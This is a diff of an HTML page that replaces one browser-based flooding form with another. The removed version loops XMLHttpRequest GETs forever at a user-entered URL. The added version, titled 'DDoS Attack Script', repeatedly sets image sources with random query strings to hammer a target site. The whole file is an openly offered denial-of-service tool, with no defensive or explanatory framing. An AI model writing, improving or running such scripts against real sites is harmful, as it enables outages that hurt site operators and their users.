@@ -1,61 +1,27 @@
-<!DOCTYPE html>
 <html>
-  <head>
-    <title>Form</title>
-    <style>
-      body {
-        background-color: #2b2b2b;
-        color: white;
-        font-family: sans-serif;
-        font-size: 16px;
-      }
-      form {
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        margin-top: 100px;
-      }
-      label {
-        margin-bottom: 10px;
-      }
-      input[type=text] {
-        padding: 10px;
-        border-radius: 5px;
-        border: none;
-        margin-bottom: 20px;
-        width: 300px;
-      }
-      button[type=submit] {
-        padding: 10px 20px;
-        border-radius: 20px;
-        border: none;
-        background-color: #ff4500;
-        color: white;
-        font-weight: bold;
-        cursor: pointer;
-        transition: background-color 0.2s ease-in-out;
-      }
-      button[type=submit]:hover {
-        background-color: #cc3700;
-      }
-    </style>
-  </head>
-  <body>
-    <form>
-      <label for="website">Website URL:</label>
-      <input type="text" id="website" name="website">
-      <button type="submit">Go</button>
-    </form>
+<head>
+    <title>DDoS Attack</title>
     <script>
-      document.querySelector('form').addEventListener('submit', function(event) {
-        event.preventDefault();
-        var url = document.querySelector('#website').value;
-        while (true) {
-          var xhr = new XMLHttpRequest();
-          xhr.open('GET', url, true);
-          xhr.send();
+        function ddos() {
+            var url = document.getElementById("url").value;
+            var img = new Image();
+            img.src = url + "/?" + Math.random();
+            var img_arr = [];
+            for (var i = 0; i < 100000; i++) {
+                img_arr.push(img);
+            }
+            for (var j = 0; j < 100; j++) {
+                for (var k = 0; k < 100000; k++) {
+                    img_arr[k].src = url + "/?" + Math.random();
+                }
+            }
         }
-      });
     </script>
-  </body>
+</head>
+<body>
+    <h1>DDoS Attack Script</h1>
+    <p>Enter the URL of the target website:</p>
+    <input type="text" id="url" placeholder="https://example.com">
+    <button onclick="ddos()">Go</button>
+</body>
 </html>
